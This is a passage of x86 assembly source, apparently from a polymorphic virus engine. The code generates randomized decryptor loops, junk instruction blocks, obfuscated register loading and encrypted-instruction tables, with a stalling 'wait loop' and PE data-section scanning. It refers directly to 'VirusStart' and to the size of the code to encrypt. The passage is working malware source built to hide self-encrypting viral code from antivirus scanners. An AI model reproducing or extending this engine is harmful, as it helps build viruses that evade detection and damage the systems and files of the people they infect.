        Call   Get_rand_range

        
        .IF    ebx != 0
            Call   LoopLikeDecryptor
        .ELSE
            Call   MakeLoop
        .ENDIF
        And   byte ptr [ebp + _garb1_reserved],0
        ret
WaitLoop_Blk endp


CmpVal  equ esi
ModifVal equ esi+4
AddFlag  equ esi+8

MakeLoop    proc    uses esi

        sub     esp, 20
        mov     esi, esp
        mov     ecx, eax
        Call    Random32
        mov     ebx, eax
        Call    ArrangeTo8Bits?
        mov     dword ptr [CmpVal], ebx
        push    ebx
        Call    Random32
        mov     ebx, eax
        Call    ArrangeTo8Bits?
        mov     edx, ebx
        .IF     edx == 0
                add     edx, 4
        .ENDIF
        pop     ebx
        
        Call    Random32
        
        .IF     Parity?
                mov     dword ptr [AddFlag], 1
               @@:
                add     ebx, edx
                dec     ecx
                jnz     @B  
        .ELSE
                and     dword ptr [AddFlag], 0
               @@:
                sub     ebx, edx
                dec     ecx
                jnz     @B  
        .ENDIF

        mov     cl, byte ptr [ebp + garb_reg1]
        Call    MovVal;*/*
        Call    LittleBlk
        Call    Make_Random_Blk;**
        push    edi

        ;Call    LittleBlk
        Call    Make_Random_Blk_no_0_disp;**
        mov     ebx, edx
        .IF     dword ptr [AddFlag] == 1
                Call  GEN_SUB_REG32_IMM
        .ELSE
                Call  GEN_ADD_REG32_IMM
        .ENDIF
        ;Call    LittleBlk
        Call    Make_Random_Blk_no_0_disp;**
        
        mov     ebx, dword ptr [CmpVal]
        mov     cl, byte ptr [ebp + garb_reg1]
        Call    GEN_CMP_REG32_IMM
        
        pop     ebx
        sub     ebx, edi
        
        Call    GEN_JNZ_OFS
        
        add     esp, 20
        ret
MakeLoop    endp


WtLp_Called     db  0
MulFactor       dd  0
;WtlpLittleLoopMode db 0

LoopRange equ esi

LoopLikeDecryptor    proc uses ebx edx ecx esi

      sub    esp, 10
      mov    esi, esp
      mov    dword ptr [LoopRange], eax
      

      
      push   dword ptr [ebp + MulFactor]
      push   dword ptr [ebp + LoopOFS]
      push   dword ptr [ebp + CMP_Range]

        
      mov    dword ptr [ebp + MulFactor], 1         ; Init factor 1
      Call   Random32
      jp     @SimpleDec

      Call   Random32
      jp     @LargeFactor
      push   2
      pop    eax
      push   30
      pop    ecx
      Call   Get_rand_range
      jmp    @SaveFactor
     @LargeFactor:
      push   30
      pop    eax
      push   1000
      pop    ecx
      Call   Get_rand_range
     @SaveFactor:
      mov    dword ptr [ebp + MulFactor], eax
      
     @SimpleDec: 

      ;mov    eax, 300000                ;large range
      ;mov    ecx, 1000000
      ;Call   Get_rand_range

      mov     eax, dword ptr [LoopRange]
      
      mov     ecx, dword ptr [ebp + MulFactor]
      imul    eax, ecx
      
      mov     ebx,eax

      mov     cl, byte ptr [ebp + garb_reg1]
      Call    MovVal;*/*
      
      mov     dword ptr [ebp + LoopOFS], edi

      Call    Make_Random_Blk;**
      Call    ModifyKey                         ; ok
      Call    Make_Random_Blk;**

      
      
      mov     ebx, dword ptr [ebp + MulFactor]
      mov     cl,byte ptr [ebp + garb_reg1]
      
      .IF   dword ptr [ebp + MulFactor] == 1 
            ;mov     byte ptr [ebp + UseDec], 1
            CAll    GEN_DEC_REG32
            
      .ELSE
            ;mov     byte ptr [ebp + UseDec], 0
            Call    Random32
            jp      @DoWithADD
            CAll    GEN_SUB_REG32_IMM
            jmp     @SkipADD
           @DoWithADD:
            neg     ebx
            CAll    GEN_ADD_REG32_IMM
      .ENDIF
     @SkipADD:
      
      push   ecx
      xor    eax, eax
      mov    ecx, 1000
      Call   Get_rand_range
      pop    ecx  
      mov    dword ptr [ebp + CMP_Range], eax
      mov    eax, dword ptr [ebp + LoopOFS]
      CALL   MakePolyJMP  
          
      pop   dword ptr [ebp + CMP_Range]
      pop   dword ptr [ebp + LoopOFS]
      pop   dword ptr [ebp + MulFactor]
      
      add   esp, 10
      ret
LoopLikeDecryptor endp

nextmod db 0
ModifyKey proc uses ecx ebx edx
      mov    byte ptr [ebp + nextmod],3
     @@:

      Call   Random32
      mov    ebx, eax
      
      Call   LittleBlk
      xor    eax,eax
      push   CRYPTNBR ;TOTALNBR - 5     
      pop    ecx
      Call   Get_rand_range  
      lea    ecx,dword ptr [ebp + InstrTBL]
      mov    edx,dword ptr [ecx + (eax * 4)]
      
      add    edx,ebp
        
      mov    ch, byte ptr [ebp + garb_reg1]         ; WaitLoop counter is garb_reg1
      mov    cl, byte ptr [ebp + key_reg]
      Call   edx
      Call   LittleBlk
      dec    byte ptr [ebp + nextmod]
      jnz    @B
      ret
      
ModifyKey endp                  

;ModifyReg proc uses edx ebx     ; Modifie n'importe quel registre puis le restaure (meme un registre réservé)
;      Call   Get2RandRegs
;      mov    ch, cl

      
;      ret
;ModifyReg endp

;       Make memory access



_garb1_reserved  db      0
_garb2_reserved  db      0



;Mem_Reg db      0     

MovVal    proc  uses ecx ebx edx esi ; in : cl = reg to move value

        push   ecx
        Call   Make_Random_Blk;**
        
        xor    eax, eax
        push   3
        pop    ecx
        Call   Get_rand_range
        pop    ecx
        
        or     eax, eax
        jz     @IWantMov
        dec    eax
        jz     @IWantPushPop
        
        push   dword ptr [ebp + _MOD]
        push   dword ptr [ebp + _SCALE]
        push   dword ptr [ebp + Displacement]
        mov    byte ptr [ebp + _REG_OPCODE], cl;-***-
        mov    byte ptr [ebp + _MOD], 0
        mov    byte ptr [ebp + _RM], 5
        mov    dword ptr [ebp + Displacement], ebx
        CALL   GEN_LEA_REG32_DISP32
        pop    dword ptr [ebp + Displacement]
        pop    dword ptr [ebp + _SCALE]
        pop    dword ptr [ebp + _MOD]
        Call   Make_Random_Blk;**
        jmp    @F
       @IWantMov:
        Call   GEN_MOV_REG32_IMM
        Call   Make_Random_Blk;**
        jmp    @F
       @IWantPushPop:
        Call   GEN_PUSH_IMM32
        Call   Make_Random_Blk;**
        Call   GEN_POP_REG32
        Call   Make_Random_Blk;**
       @@:
        ret
MovVal    endp

NextSec dd 1
DataSectionOFS dd 0
DataSectionSize dd 0
InitMemAccess   proc                            ; Retrieves the size and the offset of data section 

       @ScanForDataSection:
        mov       ebx,dword ptr [ebp+PEheader]
        assume    ebx : ptr IMAGE_NT_HEADERS
      
        movzx esi, word ptr [ebx].FileHeader.SizeOfOptionalHeader
        lea esi, [[ebx].OptionalHeader + esi]
        
        
        movzx ecx, word ptr [[ebx].FileHeader.NumberOfSections]
        sub    ecx, dword ptr [ebp + NextSec]    ; Data section ?
        jecxz @NotFound
        push  ecx
        imul  ecx,ecx,sizeof IMAGE_SECTION_HEADER
        add   esi,ecx                            ; go in data section
        pop   ecx

        
        assume esi:ptr IMAGE_SECTION_HEADER

        inc     dword ptr [ebp + NextSec]  
              
	  test	[esi].Characteristics, IMAGE_SCN_CNT_INITIALIZED_DATA or IMAGE_SCN_MEM_READ or IMAGE_SCN_MEM_WRITE
        jz      @ScanForDataSection

        mov    dword ptr [ebp + NextSec],1
        

        mov    ebx, [ebx].OptionalHeader.ImageBase
        add    ebx, [esi].VirtualAddress

        mov    dword ptr [ebp + DataSectionOFS], ebx    ; save VirtualOffset
        mov    eax, [esi].Misc.VirtualSize
        mov    dword ptr [ebp + DataSectionSize], eax
        
        
        ;Call    GetRandomDataOFS
        
@NotFound:
        ret
InitMemAccess   endp

;ActualMemRange  dd 0

GetRandomDataOFS    proc uses ecx

        mov    ebx, dword ptr [ebp + DataSectionOFS]
        mov    eax, ebx
        mov    ecx, dword ptr [ebp + DataSectionSize]
        add    ecx, ebx
        sub    ecx, 4
        Call   Get_rand_range
        ;Mov    dword ptr [ebp + ActualMemRange], eax
        mov    ebx, eax
        ret
        
GetRandomDataOFS endp        
           ; Mode 


X dd ?
EncodeMemLocation  proc  uses edx ecx  ; in : ebx = Real memory address to encode
                                       ; in : cl _REG_OPCODE or OPCODE INFO
                                       ; out : Mod/Rm_Sib = right encodings

        .IF    word ptr [ebp + _garb1_reserved] != 0
            ;.IF     byte ptr [ebp + _garb2_reserved] != 0
                ret                                             ; Return if our regs are reserved
            ;.ENDIF
        .ENDIF
        
        mov    dword ptr [ebp + Displacement], ebx
        
        mov    byte ptr [ebp + _REG_OPCODE], cl    ; must be garb_reg3!
        
        xor    eax, eax
        push   3
        pop    ecx
        Call   Get_rand_range         
        mov    byte ptr [ebp + _MOD], al            ; mode of encoding
        


        
        xor    eax, eax
        push   4
        pop    ecx
        Call   Get_rand_range    


        mov    byte ptr [ebp + _SCALE], al
        

        
        mov    cl, byte ptr [ebp + garb_reg1]
        inc    byte ptr [ebp + _garb1_reserved]  

         Call   Random32
         jp     @F
         mov    cl, 4     ; 1/2
       @@:

         mov    byte ptr [ebp + _RM],cl
       
        .IF    byte ptr [ebp + _MOD] == 0 

                     
               .IF        cl == 5
                                    ; Do nothing
                                    
               .ELSEIF    cl == 4   ; MODRM+SIB disp32
               

                    Call   Random32
                    mov    ebx, eax
                                        
                    mov    cl, byte ptr [ebp + garb_reg2]
                    
                    mov    byte ptr [ebp + _BASE], cl
                    inc    byte ptr [ebp + _garb2_reserved]
                    
                    .IF    cl == 5              ; INDEX * SCALE + Disp32 (No BASE)
                    

                        mov    cl, byte ptr [ebp + _SCALE]
                        shl    ebx, cl
                        sub    dword ptr [ebp + Displacement], ebx
                        sar    ebx, cl
                        
                        mov    cl, byte ptr [ebp + garb_reg1]
                        mov    byte ptr [ebp + _INDEX],cl
                        
                        Call   MovVal      
                        ;;;;Call   GEN_MOV_REG32_IMM       
                        
                    .ELSE                   ; BASE + INDEX * SCALE (No disp)
                    
        ; Algo : 404001  = a - b
        ; 
        ; a = 404001+X
        ; b = X
        ; a = 404001+12345678  ; this number will be divisible by scale
        ; b = 12345678


                        

                        Call   Random32
                        push   ecx
                        mov    cl, byte ptr [ebp + _SCALE]
                        shl    eax, cl
                        pop    ecx
                        mov    dword ptr [ebp + X], eax
                        mov    eax, dword ptr [ebp + Displacement]
                        add    eax, dword ptr [ebp + X]
                        mov    ebx, eax

                        Call   MovVal
                        ;;;;Call   GEN_MOV_REG32_IMM


                        

                        mov    eax, dword ptr [ebp + X]
                        mov    cl, byte ptr [ebp + _SCALE]
                        sar    eax, cl
                        mov    cl, byte ptr [ebp + garb_reg1]
                        mov    byte ptr [ebp + _INDEX],cl
                        neg    eax
                        mov    ebx, eax
                        ;;;;Call   GEN_MOV_REG32_IMM
                        Call   MovVal
                        

                    .ENDIF
                    
               .ELSE            ; Single [REG32]

                    
                    mov    ebx, dword ptr [ebp + Displacement]
                    Call   MovVal  
                    ;;;;Call   GEN_MOV_REG32_IMM
           
               .ENDIF
                       
               
        .ELSEIF byte ptr [ebp + _MOD] == 1
        

               push   ecx
               push   -80h
               pop    eax
               push   80h
               pop    ecx
               Call   Get_rand_range
               mov    ebx,eax
               pop    ecx
               

                     
                .IF  cl ==  4                       ; BASE + INDEX * SCALE + Disp
                    ShitEncode:
                     mov    cl, byte ptr [ebp + garb_reg2]
                     mov    byte ptr [ebp + _BASE], cl
                     inc    byte ptr [ebp + _garb2_reserved]
                     

                      mov    edx, ebx
                      Call   Random32
                      push   ecx
                      mov    cl, byte ptr [ebp + _SCALE]
                      shl    eax, cl
                      pop    ecx
                      mov    dword ptr [ebp + X], eax
                      mov    eax, dword ptr [ebp + Displacement]
                      add    eax, dword ptr [ebp + X]
                      sub    eax, edx
                      mov    ebx, eax
                      mov    dword ptr [ebp + Displacement], edx   
                      Call   MovVal
                      ;;;;Call   GEN_MOV_REG32_IMM
  
  
                      mov    eax, dword ptr [ebp + X]
                      mov    cl, byte ptr [ebp + _SCALE]
                      sar    eax, cl
                      mov    cl, byte ptr [ebp + garb_reg1]
                      mov    byte ptr [ebp + _INDEX],cl
                      neg    eax
                      mov    ebx, eax
                      Call   MovVal
                      ;;;;Call   GEN_MOV_REG32_IMM   
                      jmp    ExitHideMem                        
                     
                .ELSE                           ; RM + Disp8
                
                  ShitEncode2:
                      mov     eax, dword ptr [ebp + Displacement] 
                      sub     eax, ebx
                      mov     dword ptr [ebp + Displacement], ebx                      
                      xchg    eax, ebx
                      Call   MovVal
                      ;;;;Call   GEN_MOV_REG32_IMM
                      jmp    ExitHideMem
                                      
                .ENDIF
                
        .ELSEIF byte ptr [ebp + _MOD] == 2

    
               Call   GetRandomDataOFS

               
                .IF  cl ==  4                       ; SIB follow
                    
                        jmp   ShitEncode
                        
                .ELSE
                
                        jmp   ShitEncode2
                        
                .ENDIF    
                    
        .ENDIF
               

ExitHideMem:
        
        and    word ptr [ebp + _garb1_reserved], 0
        ret
EncodeMemLocation  endp

_MOD            db      0   
_REG_OPCODE     db      0
_RM             db      0              ; Register/Memory ([0-7])
_dummy          db      0

MOD_SIMPLE_MEM  equ 00b        
MOD_DISP8       equ 01b
MOD_DISP32      equ 10b
MOD_SIMPLE_REG  equ 11b

RM4_SIB_FOLLOW  equ  100b

SCALE_x2        equ     1b
SCALE_x4        equ     10b
SCALE_x8        equ     11b

Displacement    dd      0

_SCALE          db      0
_INDEX          db      0
_BASE           db      0
_dummy2         db      0

SIB_USED        equ 1
MODRM_USED      equ 1
;-----------------
;ModRM   db      0
;SIB     db      0               ; Scale Index Base
;-----------------

EncodeModRM_SIB proc  uses edx ecx
        
       ; movzx   eax, word ptr [ebp + ModRM]
       ; or      eax, eax
       ; jnz     @F                               ; Besoin de ModRM et de SIB ?
       ; ret                                     
       ;@@: 
          
        xor     eax, eax
        
        mov     ah, byte ptr [ebp + _RM] 
        shr     eax, 3
        mov     dl, byte ptr [ebp + _REG_OPCODE]
        or      ah, dl
        shr     eax, 3
        mov     dl, byte ptr [ebp + _MOD]
        or      ah, dl
        shr     eax, 2
        .IF     byte ptr [ebp + _RM]  == 4  ; Encode SIB
            xor     ecx, ecx
            
            mov     ch, byte ptr [ebp + _BASE]
            shr     ecx, 3
            mov     dl, byte ptr [ebp + _INDEX]
            or      ch, dl
            shr     ecx, 3
            mov     dl, byte ptr [ebp + _SCALE]
            or      ch, dl
            shr     ecx, 2
            mov     ah, cl
            stosw
            jmp     @F
        .ELSE
            stosb
        .ENDIF
       @@:
        
        mov    dl, byte ptr [ebp + _MOD]
        
        .IF    byte ptr [ebp + _BASE] == 5  &&  byte ptr [ebp + _RM] == 4
        
            .IF    dl   ==  0               ; NO BASE
               mov    eax, dword ptr [ebp + Displacement]
               stosd 
            .ELSEIF dl  ==   1              ; EBP
               mov    al, byte ptr [ebp + Displacement]
               stosb 
            .ELSEIF dl  ==   2              ; EBP
               mov    eax, dword ptr [ebp + Displacement]
               stosd 
            .ENDIF
            
        .ELSE

            .IF    dl == 0 
                   cmp    byte ptr [ebp + _RM], 5
                   jnz    @F
                   mov    eax, dword ptr [ebp + Displacement]
                   stosd 
            .ELSEIF dl == 1 
                   mov    al, byte ptr [ebp + Displacement]
                   stosb 
            .ELSEIF dl == 2
                   mov    eax, dword ptr [ebp + Displacement]
                   stosd 
            .ENDIF

       .ENDIF
       @@:

                           
        ;and     word ptr [ebp + ModRM],0         ; Reset ModRM & SIB
        and     dword ptr [ebp + _MOD],0
        and     dword ptr [ebp + _SCALE],0
        and     dword ptr [ebp + Displacement],0
        ret
EncodeModRM_SIB endp





;       Make {Push shit [...] push REG32  / POP REG32 / retn XXXX [...] POP SHITREG32} struct


push_pop_recursion_level db 0
;What2Do         dd 0 
Push_Pop_blk    proc

        inc     byte ptr [ebp+push_pop_recursion_level]
        cmp     byte ptr [ebp+push_pop_recursion_level],02
        jae     ExitPushPop
        
        push   ecx
        push   edx

        
        xor    eax,eax
        inc    eax
        push   7                           
        pop    ecx
        Call   Get_rand_range  

        mov    edx,eax
        push   edx       
        CALL   MakePUSHES
        Call   LittleBlk
        pop    edx
        

        CALL   MakePOPS

        pop    edx
        pop    ecx
        
        and    byte ptr [ebp+push_pop_recursion_level], 0
       ExitPushPop:
        
        ret
Push_Pop_blk    endp

MakePUSHES:

        push   edx
       

        Call   Random32
        jp     @F

        Call   Random32
        mov    ebx,eax
        Call   ArrangeTo8Bits?

        Call   LittleBlk
        CALL   GEN_PUSH_IMM32 
        Jmp    ContPushes    
        
       @@:
        
        Call   LittleBlk
        Call   Random32
        and    eax,7        
        mov    ecx,eax
        CALL   GEN_PUSH_REG32 

        
       ContPushes:
        pop    edx 
        dec    edx
        jnz    MakePUSHES
        
        ret

MakePOPS:
        
        Call   Random32
        and    eax,07Fh
        jnz    @SkipStackAdjust
        
        push   ebx
        
        mov    ebx,edx
        shl    ebx,2
        
        Call   Random32
        mov    cl,4
        jp     @F
        CALL   GEN_ADD_REG32_IMM
        pop    ebx
        ret
       @@:
        neg    ebx
        CALL   GEN_SUB_REG32_IMM
        pop    ebx
        ret
       @SkipStackAdjust:
       
        push   edx
        Call   LittleBlk
        CALL   Get2ValidAuxRegs
        CALL   GEN_POP_REG32 
        pop    edx
        dec    edx
        jnz    MakePOPS
        ret    
                
         ;--------------------------------------- CRYPT ONLY --------------------
InstrTBL          dd OFFSET GEN_ADD_REG32_IMM;--- 
                  dd OFFSET GEN_XOR_REG32_IMM
                  dd OFFSET GEN_SUB_REG32_IMM 
                  dd OFFSET GEN_ADD_REG32_IMM 
                  dd OFFSET GEN_XOR_REG32_IMM
                  dd OFFSET GEN_SUB_REG32_IMM;---    


                  dd OFFSET GEN_16BITS_OPC
                  
                  dd OFFSET GEN_ADD_REG32_REG32             ; 1
                  dd OFFSET GEN_XOR_REG32_REG32
                  dd OFFSET GEN_SUB_REG32_REG32
                  dd OFFSET GEN_ADD_REG32_REG32             ; 1
                  dd OFFSET GEN_XOR_REG32_REG32
                  dd OFFSET GEN_SUB_REG32_REG32
                  
                  dd OFFSET GEN_IMUL_REG32_REG32_IMM
                  dd OFFSET GEN_IMUL_REG32_REG32
                  ; 
                  dd OFFSET GEN_ROR_REG32_IMM8         ; 9
                  dd OFFSET GEN_ROL_REG32_IMM8 

                  dd OFFSET GEN_BSWAP_REG32
                  dd OFFSET GEN_NEG_REG32
                  dd OFFSET GEN_NOT_REG32 
                  dd OFFSET GEN_DEC_REG32;-
                  dd OFFSET GEN_INC_REG32
                  dd OFFSET GEN_DEC_REG32
                  dd OFFSET GEN_INC_REG32;-                                     

                                    
 CRYPTNBR         = (OFFSET $ - OFFSET InstrTBL) / 4
                  ;--------------------------------------- GARBAGE ONLY --------------------
                  dd OFFSET GEN_ADC_REG32_REG32
                  dd OFFSET GEN_SBB_REG32_REG32    
                  dd OFFSET GEN_AND_REG32_REG32   
                  dd OFFSET GEN_AND_REG32_IMM32
                  dd OFFSET GEN_ADC_REG32_IMM32
                  dd OFFSET GEN_SBB_REG32_IMM32

                  dd OFFSET GEN_MOV_REG32_REG32                                 
                  dd OFFSET GEN_MOV_REG32_IMM    
                  dd OFFSET GEN_MOV_REG32_REG32                                 
                  dd OFFSET GEN_MOV_REG32_IMM  
                  dd OFFSET GEN_MOV_REG32_REG32                                 
                  dd OFFSET GEN_MOV_REG32_IMM  
                  dd OFFSET GEN_MOV_REG32_REG32                                 
                  dd OFFSET GEN_MOV_REG32_IMM                      


                  
                  dd OFFSET GEN_MOVZX_REG32_REG8
                  dd OFFSET GEN_MOVSX_REG32_REG8


                  ;dd OFFSET GEN_DIV_REG32   ; Pb Exception division par 0   
                  ;dd OFFSET GEN_IDIV_REG32  ;         
                  dd OFFSET GEN_OR_REG32_REG32      
                  dd OFFSET GEN_OR_REG32_IMM32 


                  dd OFFSET GEN_ADD_REG8_REG8             
                  dd OFFSET GEN_XOR_REG8_REG8
                  dd OFFSET GEN_SUB_REG8_REG8
                  dd OFFSET GEN_ADD_REG8_IMM 
                  dd OFFSET GEN_XOR_REG8_IMM
                  dd OFFSET GEN_SUB_REG8_IMM 

                  
                  dd OFFSET GEN_ROT_STUFF
                  dd OFFSET GEN_ROT_STUFF
                  dd OFFSET GEN_ROT_STUFF
                   
                           
                  ;dd OFFSET GEN_ONEBYTE
                  
                  ;dd OFFSET GEN_IMUL_REG32         ; enlevé : change la valeur de EDX
                  ;dd OFFSET GEN_MUL_REG32

                  dd OFFSET GEN_INC_REG8        
                  dd OFFSET GEN_DEC_REG8

MEMSTART          equ   $                  
                  dd OFFSET GEN_LEA_REG32_DISP32
                  dd OFFSET GEN_LEA_REG32_DISP32
                  dd OFFSET GEN_LEA_REG32_DISP32
                  dd OFFSET GEN_LEA_REG32_DISP32
                  dd OFFSET GEN_LEA_REG32_DISP32
                  dd OFFSET GEN_LEA_REG32_DISP32
                  dd OFFSET GEN_LEA_REG32_DISP32
                  dd OFFSET GEN_LEA_REG32_DISP32
                                                 
                  dd OFFSET GEN_XADD_REG32_REG32
                  dd OFFSET GEN_XCHG_REG32_REG32    ; Ne pas déplacer / do not move this one
MEMEND            equ   $                  
MEMSTARTNBR       = (($ - OFFSET InstrTBL) / 4 ) - (( MEMEND - OFFSET MEMSTART) / 4)                                      
TOTALNBR          = (OFFSET $ - OFFSET InstrTBL) / 4   
     
;CRYPTNBR          = 14
;TOTALNBR          = 39





;XORED              dd   0
                
CryptSeq:



        push   3
        pop    eax
        push   17
        pop    ecx
        Call   Get_rand_range  
        mov    dword ptr [ebp + CryptInstrNbr],eax
        
        xor    eax,eax
        inc    eax
        push   dword ptr [ebp + CryptInstrNbr]
        pop    ecx
        Call   Get_rand_range  
        mov    dword ptr [ebp + Make_XOR_KEY],eax        

    @GenCryptorOPCODE:


        Call   Random32
        mov    ebx,eax
        Call   ArrangeTo8Bits?
        
        xor    eax,eax
        push   CRYPTNBR                             
        pop    ecx
        Call   Get_rand_range  
        
        ;;;;;;;;;;;;;;;;;;;
        ;
        lea    edx,dword ptr [ebp + InstrTBL]
        mov    edx,dword ptr [edx + (eax * 4)]
        add    edx,ebp  
        ;;;;;;;;;;;;;;;;;;;


        
        mov    ch,byte ptr [ebp + counter_reg]
        mov    cl,byte ptr [ebp + key_reg]  
        
              

        ;--------------------------------------------------------------
        Call   edx 

        Call   Make_Random_Blk;-**-
       
        ;xor    eax,eax
        ;push   13                ; 1/13
        ;pop    ecx
        ;Call   Get_rand_range  
        ;dec    eax
        ;jnz    @F

        ;xor    eax,eax
        ;push   OneSize
        ;pop    ecx
        ;Call   Get_rand_range  

        ;mov    al,byte ptr [eax+ebp+OneByte]
        ;stosb
                
        ;@@:
        
        dec    dword ptr [ebp + Make_XOR_KEY]

        jnz    @CryptNext


    @Mk_xor_key:
        mov    ch,byte ptr [ebp + key_reg]
        mov    cl,byte ptr [ebp + cypher_reg]       
        Call   GEN_XOR_REG32_REG32




      @CryptNext:

        
        dec    dword ptr [ebp + CryptInstrNbr]
        jnz    @GenCryptorOPCODE
        
        
        ret

ROT_TBL           dd OFFSET GEN_SHLD_REG32_REG32_CL
                  dd OFFSET GEN_SHRD_REG32_REG32_CL
                  dd OFFSET GEN_SAR_REG32_CL
                  dd OFFSET GEN_SHL_REG32_CL
                  dd OFFSET GEN_SHR_REG32_CL
                  dd OFFSET GEN_RCL_REG32_CL
                  dd OFFSET GEN_RCR_REG32_CL
                  dd OFFSET GEN_ROL_REG32_CL
                  dd OFFSET GEN_ROR_REG32_CL
                  dd OFFSET GEN_SHRD_REG32_REG32_IMM8
                  dd OFFSET GEN_SHLD_REG32_REG32_IMM8
                  
                  dd OFFSET GEN_RCR_REG32_IMM8         
                  dd OFFSET GEN_RCL_REG32_IMM8 
                  dd OFFSET GEN_SAR_REG32_IMM8
                  dd OFFSET GEN_SHR_REG32_IMM8
                  dd OFFSET GEN_SHL_REG32_IMM8  
                  
ROT_NBR          = (OFFSET $ - OFFSET ROT_TBL) / 4 
  
GEN_ROT_STUFF proc uses edx ecx
        push    ecx
        xor     eax, eax
        push    ROT_NBR
        pop     ecx
        Call    Get_rand_range  
        pop     ecx
        lea     edx, dword ptr [ebp + ROT_TBL]
        mov     edx, dword ptr [edx + (eax * 4)]
        add     edx, ebp
        call    edx
        ret
GEN_ROT_STUFF endp

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
CryptInstrNbr   dd 0                    ; Number of cryptologic instructions
Make_XOR_KEY    dd 0                    ; if 0 make xor cypher_reg, key_reg
SafeSeq         dd OFFSET GEN_ADD_REG32_IMM


Save_regs proc

        mov dword ptr [ebp + REG_EAX],eax
        mov dword ptr [ebp + REG_ECX],ecx
        mov dword ptr [ebp + REG_EDX],edx
        mov dword ptr [ebp + REG_EBX],ebx
        mov dword ptr [ebp + REG_ESI],esi
        mov dword ptr [ebp + REG_EDI],edi

        ret
Save_regs endp

Restore_regs proc

        mov eax,dword ptr [ebp + REG_EAX]
        mov ecx,dword ptr [ebp + REG_ECX]
        mov edx,dword ptr [ebp + REG_EDX]
        mov ebx,dword ptr [ebp + REG_EBX]
        mov esi,dword ptr [ebp + REG_ESI]
        mov edi,dword ptr [ebp + REG_EDI]
        
        ret
        
Restore_regs endp

;ReturnAddr dd 0

SetSeq proc

        and    byte ptr [ebp + CryptBackward],0      ; Default scan foreward

        Call   Random32
        jp     @F
        inc    byte ptr [ebp + CryptBackward]       ; scan backward
       @@:
       
     _SEQNEXT:
        xor    eax,eax
        push   6                  ; 6 Sequences
        pop    ecx
        Call   Get_rand_range     ; Random instruction Sequence

        
        or     eax,eax
        jz     _SEQ1
        dec    eax
        jz     _SEQ2
        dec    eax
        jz     _SEQ3
        dec     eax
        jz     _SEQ4
        dec    eax
        jz     _SEQ5
        dec    eax
        jz     _SEQ6

        
    _SEQ1:
        CALL @@PC_SEQBASE
        CALL @@PC_SEQSIZE
        CALL @@PC_SEQKEY
        jmp  _SEQEXIT     
    _SEQ2:
    
        CALL @@PC_SEQBASE
        CALL @@PC_SEQKEY         
        CALL @@PC_SEQSIZE
        jmp  _SEQEXIT            
    _SEQ3:
    
        CALL @@PC_SEQSIZE
        CALL @@PC_SEQBASE
        CALL @@PC_SEQKEY         
        jmp  _SEQEXIT     
    _SEQ4:

        CALL @@PC_SEQSIZE
        CALL @@PC_SEQKEY          
        CALL @@PC_SEQBASE
        jmp  _SEQEXIT               
    _SEQ5:
    
        CALL @@PC_SEQKEY  
        CALL @@PC_SEQSIZE
        CALL @@PC_SEQBASE        
        jmp  _SEQEXIT     
    _SEQ6:   
        CALL @@PC_SEQKEY  
        CALL @@PC_SEQBASE  
        CALL @@PC_SEQSIZE         

 _SEQEXIT:            
        .IF    byte ptr [ebp + WtLp_Called] == 0
               Call   Make_Random_Blk;-**-
               Call    WaitLoop_Blk
               Call   Make_Random_Blk;-**-   
               inc     byte ptr [ebp + WtLp_Called]  
        .ENDIF
        
        mov   dword ptr [ebp + LoopOFS],edi
        ;Call  CryptSeq
        ;Call  LittleBlk                   ; put garb
        ret
        

   
SetSeq endp  

CallWaitLoop?   proc uses ecx


        xor    eax,eax
        push   3
        pop    ecx
        Call   Get_rand_range 
        or     eax, eax
        jnz    @F
        .IF    byte ptr [ebp + WtLp_Called] == 0
               Call   Make_Random_Blk;-**-
               Call   WaitLoop_Blk
               Call   Make_Random_Blk;-**-   
               inc     byte ptr [ebp + WtLp_Called]  
        .ENDIF
       @@:
        ret
CallWaitLoop?   endp

CryptBackward    db  0

;=========  =========  =========  =========  [BASE] =========  =========  =========  =========      
@@PC_SEQBASE:

        Call   CallWaitLoop?
        
        mov    eax,edi
        inc    eax
        mov    dword ptr [ebp + BaseOFS],eax

        

        mov    ebx, OFFSET VirusStart ;
        ;mov     ebx, dword ptr [ebp + What2encrypt];::
        ;sub     ebx, dword ptr [ebp + @Delta];::
        ;add    ebx, dword ptr [ebp + RVA_What2encrypt]
        ;sub    ebx, ebp
        
        .IF    byte ptr [ebp + CryptBackward]  != 0
               add    ebx, dword ptr [ebp + SizeOfWhat2encrypt]
               inc    ebx
        .ENDIF
       
        Call   HideConst

        xor    eax,eax
        push   3
        pop    ecx
        Call   Get_rand_range 



        mov    cl,byte ptr [ebp + base_reg]        
        
        or     eax,eax
        jz     @PC_BASE_PUSHPOP
        
        dec    eax
        jz     @PC_BASE_LEA

    @PC_BASE_MOV:  

        CALL   GEN_MOV_REG32_IMM
        Call   Make_Random_Blk;**
        mov    cl,byte ptr [ebp + base_reg]
        Call   RestConst 
        Call   Make_Random_Blk;**

        ret

    @PC_BASE_PUSHPOP:

        CALL   GEN_PUSH_IMM32
        Call   Make_Random_Blk;**
        CALL   GEN_POP_REG32
        Call   Make_Random_Blk;**
        mov    cl,byte ptr [ebp + base_reg]
        Call   RestConst 
        Call   Make_Random_Blk;**

        ret
        
    @PC_BASE_LEA:


        inc    dword ptr [ebp + BaseOFS]            ; because LEA takes one byte more
        mov    byte ptr [ebp + _REG_OPCODE], cl;-***-
        mov    byte ptr [ebp + _MOD], 0
        mov    byte ptr [ebp + _RM], 5
        mov    dword ptr [ebp + Displacement], ebx
        CALL   GEN_LEA_REG32_DISP32
        Call   Make_Random_Blk;**
        mov    cl,byte ptr [ebp + base_reg]
        Call   RestConst 
        Call   Make_Random_Blk;** 
        ret
         
        CMP_Range       dd      0
;=========  =========  =========  ========= [SIZE] =========  =========  =========  =========        
@@PC_SEQSIZE:

        Call   CallWaitLoop?
        
        mov    ebx, dword ptr [ebp + SizeOfWhat2encrypt]   
        shr    ebx,2
        inc    ebx
        inc    ebx
        and    dword ptr [ebp + CMP_Range],0

        ;.IF    byte ptr [ebp + CryptBackward]  == 0
      
              
        ;      xor    eax,eax
        ;      push   30
        ;      pop    ecx
        ;      Call   Get_rand_range 
      
        ;      mov    dword ptr [ebp + CMP_Range],eax
        ;      
        ;      add    ebx,eax                          ; make size different
        ;
        ;.ENDIF
       
        Call   HideConst
 

        xor    eax,eax
        push   3
        pop    ecx
        Call   Get_rand_range 
        
        mov    cl,byte ptr [ebp + counter_reg]
        
 
  
        or     eax,eax
        jz     @PC_SIZE_MOV

        dec    eax
        jz     @PC_SIZE_LEA
    @PC_SIZE_PUSHPOP:

        CALL   GEN_PUSH_IMM32
        Call   Make_Random_Blk;**
